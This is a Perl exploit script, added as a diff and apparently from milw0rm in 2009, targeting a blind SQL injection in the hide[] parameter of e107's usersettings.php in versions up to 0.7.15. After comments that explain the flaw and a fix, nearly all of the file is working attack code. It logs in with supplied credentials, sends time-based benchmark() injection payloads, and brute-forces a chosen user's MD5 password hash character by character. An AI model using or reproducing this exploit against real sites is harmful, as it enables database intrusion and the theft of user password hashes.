@@ -1,0 +1,236 @@
+#!/usr/bin/env perl
+#
+# e107 <= 0.7.15 "extended_user_fields" Blind SQL Injection Exploit
+#
+# Description
+# -------------------------------------------------------------------
+# e107 contains one flaw that allows an attacker to carry out an SQL
+# injection attack. The issue is due to the "usersettings.php" script 
+# not properly saniting user-supplied input to the hide[] key. 
+# This may allow an attacker to inject or manipulate sql queries in
+# the backend database if magic_quotes_gpc = off.
+# -------------------------------------------------------------------
+# Code Details (usersettings.php) 
+# -------------------------------------------------------------------
+# Line 433 - 441 
+#
+# if($ue_fields) {
+#    $hidden_fields = implode("^", array_keys($_POST['hide'])); <------ {1}
+#     
+#     if($hidden_fields != "")
+#     {
+#	 $hidden_fields = "^".$hidden_fields."^";  
+#     }
+#     $ue_fields .= ", user_hidden_fields = '".$hidden_fields."'"; <---- {2}
+#   }
+#
+# Line 470 - 476
+#  
+#  if($ue_fields) 
+#  {
+#    [etc..]
+#    $sql->db_Update("user_extended", $ue_fields." WHERE user_extended_id = '".intval($inp)."'");
+#  }  
+#  
+# ue[] POST variable needs a valid key
+# such as "aim","msn" or other user_extended_fields
+# (@fields array). 
+#
+# Fix this sql injection using (php function)
+# mysql_real_escape_string to the POST 'hide' key,
+# otherwise find a way to fix it. dont care
+# ------------------------------------------
+# Discovered & Written 
+# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
+#  
+# Thanks to
+# ---------------------------------------------
+# JosS,girex,str0ke,certaindeath,plucky
+# #zeroidentity chan - http://zeroidentity.org
+# ---------------------------------------------
+# http://www.youtube.com/watch?v=0rgInHvW8Ic
+# http://www.youtube.com/watch?v=O2y62xcUJ8E
+# ---------------------------------------------
+
+use LWP::UserAgent;
+
+
+my $prefix = "e107_"; # default table_prefix
+my $type_i = undef;
+my $sock_u = new LWP::UserAgent;
+
+my ($domain,$user_name,$user_pwd,$target) = @ARGV;
+
+
+e107::Usage() unless scalar (@ARGV) > 3; 
+  
+e107::Login($user_name,$user_pwd);
+$type_i = e107::ExtendedField();
+e107::Exploit();
+    
+
+sub e107::Usage
+{
+       print "e107 <= 0.7.15 'extended_user_fields' Blind SQL Injection Exploit\n";
+       print "Usage: perl xpl.pl http://[host]/[path] [username] [password] [target id]\n";
+       print "Usage: perl xpl.pl http://localhost/e107 yeat an4rchy 1\n";
+       exit;
+}       
+
+sub e107::Exploit
+{
+     e107::Vulnerable();
+     e107::BruteForce(); 
+}
+
+
+
+sub e107::SqlQuery
+{
+       my ($do_query,$response,$start,$down,$element);
+       
+       $do_query = $_[0] || die $!;
+       
+       $start = time();
+  
+       $response = $sock_u->post($domain.'/usersettings.php',
+                               [
+                                 "email"           => 'doesnt@exists.net',
+                                 "ue[user_$type_i]" => 1,
+                                 "hide[$do_query]" => 1,
+                                 "updatesettings"  => 'Save Settings',
+                              ]) or die $!;
+       $down = time();
+       
+       return $down - $start;                            
+}
+
+
+
+sub e107::CheckField
+{
+       my ($do_query,$response,$start,$down,$element);
+       
+       $do_query = $_[0];
+       $element  = $_[1] || die $!;  
+       
+       
+       $start = time();
+  
+       $response = $sock_u->post($domain.'/usersettings.php',
+                               [
+                                 "email"           => 'doesnt@exists.net',
+                                 "ue[user_$element]" => 1,
+                                 "hide[$do_query]" => 1,
+                                 "updatesettings"  => 'Save Settings',
+                              ]) or die $!;
+       $down = time();
+       
+       return $down - $start;                            
+}
+      
+      
+
+sub e107::ExtendedField
+{
+       my @fields = ('yeat','aim','birthday','icq','language','location','msn','yahoo','homepage');
+       
+       my $query = "\x27/**/OR/**/CASE/**/WHEN(1>0)/**/THEN".
+                   "/**/benchmark(100000000,CHAR(0))/**/END#";
+                   
+       for (my $i=1;$i<8;$i++) {
+             
+             if (e107::CheckField($query,$fields[$i]) > 6) {
+                return $fields[$i]; last;
+             }     
+             unless ($i != 8 && $fields[$i]) {
+               die("Site not vulnerable..\n");
+             }
+       }          
+} 
+        
+        
+
+sub e107::SqlBrute
+{
+       my $ascii = $_[0];
+       my $limit = $_[1] || 1;
+       
+       my $sql_query = "\x27/**/OR/**/(SELECT/**/IF((ASCII(SUBSTRING(user_password,$limit,1))".
+                       "=$ascii),benchmark(200000000,CHAR(0)),0)/**/FROM/**/${prefix}user/**/".
+                       "WHERE/**/user_id=$target)#";
+       
+       return $sql_query;                
+}
+
+
+
+sub e107::BruteForce
+{
+       my $i = 1;
+       my @charset = (97..102,48..57);
+       my $convert = undef;
+       my $result  = undef;
+       
+       
+       for ($i..32) {
+             
+             foreach $convert (@charset) {
+                   
+                   if (e107::SqlQuery(e107::SqlBrute($convert,$i)) > 9) {
+                      syswrite(STDOUT,chr($convert)); $i++;
+                      last; $result .= chr($convert);
+                   }              
+             }
+       }
+       
+       unless (length($result) != 32) {
+          print "\nHash MD5: $result\n";
+          print "User ID: $target\n";
+       }
+}
+
+
+
+sub e107::Vulnerable
+{             
+       my @fields = ('yeat','aim','birthday','icq','language','location','msn','yahoo','homepage');
+       
+       for (my $i=1;$i<8;$i++) {
+       
+            if ($fields[$i] eq $type_i) {
+               print "Exploiting..\n"; last;
+            }
+            else {
+               die ("Site not vulnerable..\n");
+            }
+       }             
+}       
+    
+                         
+
+sub e107::Login
+{
+        my ($username,$password) = @_;
+        my ($result,$response);
+        
+        $response =  $sock_u->post($domain.'/signup.php',
+                                 [
+                                   username  => $username,
+                                   userpass  => $password,
+                                   userlogin => 'Login',
+                                   autologin => 0
+                                 ]) or die $!;
+        
+        $result = $response->as_string;                         
+                                 
+        if ($result =~ /e107cookie=(\d+)\.([0-9a-f]{32})/i) {
+             $sock_u->default_header('Cookie' => "e107cookie=$1.$2;"); 
+             $sock_u->agent('Lynx (textmode) - Logged');
+        }
+        else {
+           die("Login failed..\n");
+        }   
+}
+
+# milw0rm.com [2009-04-20]
